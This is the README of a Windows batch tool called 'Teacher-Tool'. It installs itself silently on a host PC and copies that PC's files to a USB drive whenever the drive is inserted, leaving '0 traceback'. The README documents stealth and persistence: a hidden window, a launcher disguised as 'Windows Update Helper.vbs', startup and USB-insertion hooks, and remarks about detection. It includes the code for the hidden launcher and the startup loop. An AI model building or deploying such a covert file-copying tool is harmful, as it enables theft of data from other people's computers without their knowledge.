### <4.7 = Trojan; <7.0 = startup disabled
### Teacher-Tool does not handle UTF characters like ů, ú, ř, š, etc... Do not use them

# Teacher-Tool

Batch program created to enable quick copying with "0" traceback   

HIGHLY ENCOURAGED TO USE NEWER VERSIONS, OLDER MAY HAVE SEVERE BUGS  


"for fun" downgrading to v1.2 is a bad idea, aside from the bugs, and the limited option, the install location means having suprisingly enough 1 working version (the new one, although would probably crash) and 1 broken vbs, which would then, after replug of usb lead to 2 identical versions running at the same time with 2 vbs, which cant be uninstalled, because of locations and file names; BAD IDEA  
# How to install and use

to install, you need lmao.bat; others will be generated automatically
Installation takes around a second with hdd init taking additional 2 secs(window already hidden), however most of this time, the cmd is invisible  

after install you only need lmao69.dat with "initcopy" inside (without quotes)  

# File Options

novbs.dat -> enables "Debug" mode meaning that you can see the cmd window (OPTIONAL)[DEBUG]  

dontcopy.dat -> disables copying (OPTIONAL)  

UNIN000.dat -> uninstalls the "tool" (OPTIONAL)  

atinsert.dat -> adds programs to be executed at usb insertion (only .bat); works only if name in lmao69.dat (OPTIONAL) 

atstartup.dat -> adds programs to be executed at startup (only .bat); works only if name in lmao69.dat (OPTIONAL)  
code for handling these:
`if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a"))`  

transfer.dat -> copy files to hdd upon usb insert; D:\transfer\Desktop\idk.docx => C:\Windows\Users\USERNAME\Desktop\idk.docx (OPTIONAL)  

lmao69.dat -> file responsible for detecting the usb. needs "initcopy" or .bat filename inside (gets executed) to work (ESSENTIAL)  
If you want to rename lmao69.dat, the 46th line in lmao.bat needs to be changed to `set filename=YOUR_FILENAME`  NOTE: In order for this to work, the file on HDD needs the same change; see below

force_dat.dat -> if the program doesn't check the file for some reason (i.e. the check for initcopy is disabled(alwaysinitcopy)), this forces the check (OPTIONAL)  

debugmsg.dat -> enables return to normal behavior, in case you dont want the pretty variant (OPTIONAL)[DEBUG]  
## >=7.0

customcopy.dat -> will force TT to use a custom .bat script instead of default copy command(put .bat script into file), if launch fails, reverts to default (see add. modules - CCS) (OPTIONAL)  

elseabortcopy.dat -> instead of default fallback for the above, if fails, skips default copy script (OPTIONAL)  

newdefault.dat -> applies custom script to be used as new default (without customcopy present, uninstalls custom script) (OPTIONAL)  

forceupd.dat -> forces update/reinstall even if the version on the hdd is the same (OPTIONAL)  

skipdatechange.dat -> ...skips datechange, thus speeding up hdd init(after install) by about 2 secs (OPTIONAL)[DEBUG]  

## INTERNAL
no/skip.dat -> internally saves elseabortcopy for custom scripts  
alreadycopied.dat, copied.dat -> files used to save install progress  
beware.dat -> generated if downgraded >4.5[DBGrls]  
<7.0 - doing.dat -> redundant file used in certain DBGrls for copy status, remains in :whileexist(still in this version)  
~debugmsg.dat -> debugmsg option copied to hdd, so that debugmsg lasts for the entire program  
lst.dat -> used by add. mod. CCS to store copied files alongside a few other with bad names  

# 3 additional modules

I have also added 2 additional .bat files that help with certain stuff. First one is uninstallexts.dat, which is used to delete all extra apps installed by atstartup or atinsert and alwaysinit.bat which skips the lmao69.dat check (to check for .bat or initcopy)  
## compile custom script.bat (#3)
A custom copy script, where i gave up at 95%(symbols like & and ^ spit out errors if in files...). Allows resume of copying with only a list file on usb  
This means, that if your usb completely fills up, you can unplug the usb, delete the files and CCS will resume where it left off (lst.dat MUST be on the usb)  
warning: this creates 5 files and 2 folders, all  hidden, but still(literally cannot be done with less files, i tried); also the dir. structure has to be remade...  
I DO NOT RECOMMEND THIS SCRIPT FOR REALLY USED COMPUTERS; on frequently used PCs, the dir. structure can be massive and the time loss is too great for this to be meaningfull...  

# NOTE

~~in order to change filename and not reinstall(i.e. dont have the time), use rename.bat(in optional) with atstartup(CHANGE LINE IN FILE); for the first time(install the file), you still the old one~~  < just do forceupd.dat with lmao.bat on usb with edited line(kinda _findable_(ln 46) if you open with notepad) and for the first time include both lmao69.dat and your custom  

use TERMINATE.bat to escape >3.7 bugged update (put filename in lmao69.dat(or custom name))

if you wish to use older versions/debug versions before 4.1, either download vbs from old releases or put this in "Windows Update Helper.vbs":  
```
'idk
Set WshShell = CreateObject("WScript.Shell")
'idk
WshShell.Run chr(34) & "C:\Users\styso\AppData\Roaming\Microsoft\Windows\lmao.bat" & Chr(34), 0
'idk
'idk
Set WshShell = Nothing 
'idk
'idk
```

## Current version: 7.0 (5.5[DEBUGrelease] with some heavy modifications)  
### Current Debug Version: 5.5[DEBUGrelease] (5.4 with some removed lines, fixed beware.dat, fixed titles and added installing... instead of upgrading while ... installing)  
-------------------
#### I am not responsible for any problems that may arise while using this tool.  
#### Only for educational purposes
-------------------
if testing out previous versions (aside of above mentioned issue and the one at the beginning), read "readmes" in their releases, this one obviously doesnt apply to them  

~~Actual development was stopped in may 2022. Beware, i am no longer checking if it is detected...~~  
~~I may resume at a later date but right now, there will not be any updates...~~  
DEVELOPMENT RESUMED
